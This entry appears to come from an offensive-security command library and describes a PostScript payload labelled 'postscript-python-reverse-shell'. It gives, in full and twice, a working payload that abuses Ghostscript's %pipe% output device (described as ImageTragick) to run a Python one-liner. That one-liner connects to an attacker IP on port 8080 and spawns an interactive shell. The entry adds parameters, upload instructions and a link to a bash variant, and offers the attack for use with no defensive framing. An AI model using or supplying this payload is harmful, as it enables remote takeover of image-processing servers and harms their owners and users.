---
data: >-
  |%!PS userdict /setpagedevice undef legal { null restore } stopped { pop } if
  legal mark /OutputFile (%pipe%python -c 'import
  socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[redacted-ip]",8080));os.dup2(s.fileno(),0);
  os.dup2(s.fileno(),1);
  os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);') currentdevice
  putdeviceprops
tags:
  - rce
  - postscript
type: command
output: Reverse shell connection established
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:15.389Z'
id: 660ed9a7-47e3-4aca-aa06-3fac311f72d5
verified: false
validated: true
submitted: true
---
# postscript-python-reverse-shell

## Command

```bash
%!PS userdict /setpagedevice undef legal { null restore } stopped { pop } if legal mark /OutputFile (%pipe%python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[redacted-ip]",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);') currentdevice putdeviceprops
```

## Description

PostScript payload exploiting ImageTragick to execute Python code that spawns a reverse shell via socket connection to attacker listener.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| OutputFile | Pipes to Python subprocess for shell | Yes |
| [redacted-ip] | Attacker IP for connection | Yes |
| 8080 | Listener port | Yes |

## Examples

### Basic Usage

Save as file and upload:
```bash
# Content as above
```

### Advanced Usage

For bypass: Use bash variant [[commands/postscript-bash-reverse-shell]]

## Expected Output

Reverse shell connection established to netcat listener.

## Related

- [[commands/postscript-bash-reverse-shell]]
